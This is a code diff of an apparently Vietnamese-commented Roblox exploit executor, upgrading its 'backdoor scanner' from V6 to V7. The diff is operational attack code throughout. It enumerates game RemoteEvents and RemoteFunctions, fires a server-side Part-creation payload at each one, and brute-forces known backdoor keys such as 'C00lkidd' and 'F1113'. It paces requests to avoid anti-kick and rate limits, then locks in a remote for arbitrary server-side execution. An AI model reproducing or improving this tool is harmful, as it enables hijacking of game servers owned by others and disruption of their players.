@@ -662,118 +662,191 @@ end
 makeDraggable(UI.MainMenu)
 makeDraggable(UI.Menu)
 
---=========================================
--- SM-EXECUTOR: CORE SCANNER EXTREME V6
--- INTEGRATED LALOL LOGIC + ANTI-KICK
---=========================================
+--[[
+    SM-EXECUTOR: CORE SCANNER EXTREME V7 [PROTOTYPE]
+    VERSION: 7.0.2 (RE-ENGINEERED)
+    LOGIC: MULTI-THREADED LALOL + ADAPTIVE BACKDOOR DETECTION
+    STABILITY: HIGH (ANTI-LAG BATCHING)
+--]]
 
-local function runUltraScanExtremeV6()
+-- Services
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Workspace = game:GetService("Workspace")
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+
+-- Configuration & State
+local Config = {
+    BatchSize = 150, -- Số lượng object xử lý mỗi frame để tránh lag
+    WaitTime = 0.05, -- Delay giữa các giai đoạn kiểm tra
+    RetryAttempts = 2,
+    VerificationToken = "SM_X7_" .. HttpService:GenerateGUID(false):sub(1, 6)
+}
+
+local EngineState = {
+    Scanning = false,
+    TargetRemote = nil,
+    ValidKey = nil,
+    ExecuteMethod = 1,
+    DiscoveredRemotes = {},
+    LogHistory = {}
+}
+
+-- Dictionary mở rộng (Tích hợp LALOL, SM, và phổ biến 2024-2026)
+local ExtremeKeys = {
+    "Run", "Execute", "Load", "SS", "Admin", "F1113", "C00lkidd", "Pex", "Kohl",
+    "Request", "ServerSide", "Console", "Main", "Control", "Fire", "Update"
+}
+
+-- Helper Functions
+local function safeLog(msg, color)
+    local timestamp = os.date("%X")
+    print(string.format("[%s] [SM-LOG]: %s", timestamp, msg))
+    -- Giả định hàm UI safeLog của bạn đã tồn tại bên ngoài
+    if _G.UIPanelLog then
+        _G.UIPanelLog(msg, color)
+    end
+end
+
+local function checkServerSideVerification()
+    -- Kiểm tra xem server có thực thi mã tạo Part không
+    local verified = Workspace:FindFirstChild(Config.VerificationToken)
+    if verified then
+        verified:Destroy()
+        return true
+    end
+    return false
+end
+
+-- Main Executor Logic
+local function runUltraScanExtremeV7()
     if EngineState.Scanning then return end
     EngineState.Scanning = true
     
+    -- Reset State
     EngineState.TargetRemote = nil
     EngineState.ValidKey = nil
-    EngineState.ExecuteMethod = 1
+    EngineState.DiscoveredRemotes = {}
     
-    UI.ScanBtn.Text = "SCANNING..."
-    UI.ScanBtn.BackgroundColor3 = Colors.Warning
-
-    -- Bộ Dictionary kết hợp từ LALOL và SM
-    local extremeKeys = {"Run", "Execute", "Load", "SS", "Admin", "F1113", "C00lkidd", "Pex", "Kohl"}
-    local verifyToken = "SM_VERIFIED_" .. math.random(1000, 9999)
+    UI.ScanBtn.Text = "INITIALIZING..."
+    UI.ScanBtn.BackgroundColor3 = Color3.fromRGB(200, 150, 0)
 
     task.spawn(function()
-        -- GIAI ĐOẠN 1: QUÉT AN TOÀN (GIỮ NGUYÊN ANTI-KICK)
-        local allObjects = game:GetDescendants()
-        local remotes = {}
+        -- GIAI ĐOẠN 1: QUÉT PHÂN TẦNG (HIGH-SPEED INDEXING)
+        safeLog("Bắt đầu quét tầng sâu hệ thống...", Color3.fromRGB(255, 255, 255))
         
-        for i, v in ipairs(allObjects) do
-            if i % 120 == 0 then
-                UI.ScanBtn.Text = "SCAN: " .. math.floor((i/#allObjects)*100) .. "%"
-                task.wait() 
-            end
-            if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
-                local path = v:GetFullName()
-                if not path:find("RobloxReplicatedStorage") and not path:find("ChatService") then
-                    table.insert(remotes, v)
+        local targetServices = {ReplicatedStorage, Workspace, game:GetService("JointsService")}
+        local rawObjects = {}
+        
+        for _, service in ipairs(targetServices) do
+            local descendants = service:GetDescendants()
+            for i, obj in ipairs(descendants) do
+                table.insert(rawObjects, obj)
+                -- Batching để tránh treo game
+                if i % Config.BatchSize == 0 then
+                    UI.ScanBtn.Text = "INDEXING: " .. math.floor((i/#descendants)*100) .. "%"
+                    RunService.Heartbeat:Wait()
                 end
             end
         end
 
-        safeLog("🔍 Tìm thấy " .. #remotes .. " Remote. Đang áp dụng Check Methods...", Colors.Warning)
+        for _, obj in ipairs(rawObjects) do
+            if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
+                local name = obj.Name:lower()
+                -- Lọc bỏ các remote mặc định của Roblox
+                if not obj:IsDescendantOf(game:GetService("Chat")) and not name:find("adservice") then
+                    table.insert(EngineState.DiscoveredRemotes, obj)
+                end
+            end
+        end
 
-        -- GIAI ĐOẠN 2: 5-METHOD VERIFICATION (CHẬM & CHẮC)
-        for index, remote in ipairs(remotes) do
+        safeLog("Phân tích thành công " .. #EngineState.DiscoveredRemotes .. " cổng Remotes.", Color3.fromRGB(255, 200, 0))
+
+        -- GIAI ĐOẠN 2: THẨM ĐỊNH ĐA PHƯƠNG THỨC (MULTI-METHOD VERIFICATION)
+        for i, remote in ipairs(EngineState.DiscoveredRemotes) do
             if EngineState.TargetRemote then break end
             
-            UI.ScanBtn.Text = "V-CHECK: " .. index .. "/" .. #remotes
-            task.wait(0.15) -- Delay để chống bị kick dồn dập
+            UI.ScanBtn.Text = "V-CHECK: " .. i .. "/" .. #EngineState.DiscoveredRemotes
+            task.wait(0.1) -- Giãn cách để tránh Rate Limit / Anti-Kick
 
             pcall(function()
-                -- Tích hợp logic LALOL: Print Verification
-                local checkCode = "print('" .. verifyToken .. "') local p = Instance.new('Part', workspace) p.Name = '" .. verifyToken .. "' p.Transparency = 1 task.wait(0.1) p:Destroy()"
+                -- Mã kiểm tra: Tạo một Part ẩn ở Server-side
+                local testPayload = string.format(
+                    "local p = Instance.new('Part', workspace); p.Name = '%s'; p.Transparency = 1; p.CanCollide = false; p.Anchored = true;",
+                    Config.VerificationToken
+                )
 
-                -- Thử các Method thực thi
-                local function fire(k, m)
-                    if remote:IsA("RemoteEvent") then
-                        if m == 1 then remote:FireServer(checkCode)
-                        elseif m == 2 then remote:FireServer("Execute", checkCode)
-                        elseif m == 3 then remote:FireServer(k, checkCode) end
-                    else
-                        local res = remote:InvokeServer("return '" .. verifyToken .. "'")
-                        if res == verifyToken then return true end
-                    end
-                    return false
-                end
-
-                -- Vòng lặp check thực tế
-                for m = 1, 3 do
-                    if fire(nil, m) then 
-                        -- Check vật lý (Part) hoặc Log
-                        if workspace:FindFirstChild(verifyToken) then
-                            EngineState.TargetRemote = remote
-                            EngineState.ExecuteMethod = m
-                            break
-                        end
-                    end
-                    
-                    -- Nếu chưa ra, thử Brute-force Key như LALOL
-                    for _, k in ipairs(extremeKeys) do
-                        if fire(k, 3) then
-                            if workspace:FindFirstChild(verifyToken) then
-                                EngineState.TargetRemote = remote
-                                EngineState.ValidKey = k
-                                EngineState.ExecuteMethod = 3
-                                break
+                -- Các Method tấn công logic
+                local methods = {
+                    [1] = function() -- Standard Fire
+                        if remote:IsA("RemoteEvent") then remote:FireServer(testPayload) end
+                    end,
+                    [2] = function() -- Named Execute
+                        if remote:IsA("RemoteEvent") then remote:FireServer("Execute", testPayload) end
+                    end,
+                    [3] = function() -- Dictionary Key Bruteforce
+                        for _, key in ipairs(ExtremeKeys) do
+                            if EngineState.TargetRemote then break end
+                            if remote:IsA("RemoteEvent") then 
+                                remote:FireServer(key, testPayload)
+                                task.wait(0.05)
+                                if checkServerSideVerification() then
+                                    EngineState.ValidKey = key
+                                    return true
+                                end
                             end
                         end
+                    end,
+                    [4] = function() -- Invoke Return Check
+                        if remote:IsA("RemoteFunction") then
+                            local res = remote:InvokeServer("return '" .. Config.VerificationToken .. "'")
+                            return res == Config.VerificationToken
+                        end
                     end
+                }
+
+                -- Chạy thử nghiệm từng Method
+                for mIndex = 1, #methods do
                     if EngineState.TargetRemote then break end
+                    
+                    local success = methods[mIndex]()
+                    task.wait(0.1) -- Chờ server phản hồi
+
+                    if success or checkServerSideVerification() then
+                        EngineState.TargetRemote = remote
+                        EngineState.ExecuteMethod = mIndex
+                        break
+                    end
                 end
             end)
         end
 
-        -- GIAI ĐOẠN KẾT THÚC
+        -- GIAI ĐOẠN KẾT THÚC: REPORT & HOOK
         if EngineState.TargetRemote then
-            UI.ScanBtn.Text = "SS SECURED!"
-            UI.ScanBtn.BackgroundColor3 = Colors.Success
-            UI.ExecuteBtn.Text = "EXECUTE (SS)"
-            UI.ExecuteBtn.BackgroundColor3 = Colors.SS
-            UI.NameLabel.Text = "SM [SS ACTIVE]"
+            UI.ScanBtn.Text = "ACCESS GRANTED"
+            UI.ScanBtn.BackgroundColor3 = Color3.fromRGB(0, 255, 100)
+            UI.ExecuteBtn.Text = "FIRE SERVER-SIDE"
+            UI.ExecuteBtn.Visible = true
             
-            safeLog("✅ Đã khóa mục tiêu: " .. EngineState.TargetRemote.Name, Colors.Success)
-            if EngineState.ValidKey then safeLog("🔑 Key: " .. EngineState.ValidKey, Colors.Success) end
+            safeLog("✅ TRUY CẬP THÀNH CÔNG: " .. EngineState.TargetRemote:GetFullName(), Color3.fromRGB(0, 255, 0))
+            if EngineState.ValidKey then
+                safeLog("🔑 KEY PHÁT HIỆN: " .. EngineState.ValidKey, Color3.fromRGB(0, 255, 200))
+            end
         else
             UI.ScanBtn.Text = "SCAN FAILED"
-            UI.ScanBtn.BackgroundColor3 = Colors.Error
-            safeLog("❌ Không tìm thấy cổng vào khả dụng.", Colors.Error)
-            task.wait(2)
-            UI.ScanBtn.Text = "Scan Backdoor"
-            UI.ScanBtn.BackgroundColor3 = Color3.fromRGB(255, 115, 90)
+            UI.ScanBtn.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
+            safeLog("❌ Không tìm thấy lỗ hổng Remote khả thi.", Color3.fromRGB(255, 50, 50))
+            task.wait(3)
+            UI.ScanBtn.Text = "RESCAN BACKDOOR"
+            UI.ScanBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
         end
+
         EngineState.Scanning = false
     end)
 end
+
+-- Binding (Giả định nút bấm UI của bạn)
+UI.ScanBtn.MouseButton1Click:Connect(runUltraScanExtremeV7)
 
 --=========================================
 -- 3-METHOD EXECUTE (SM-LOGIC)
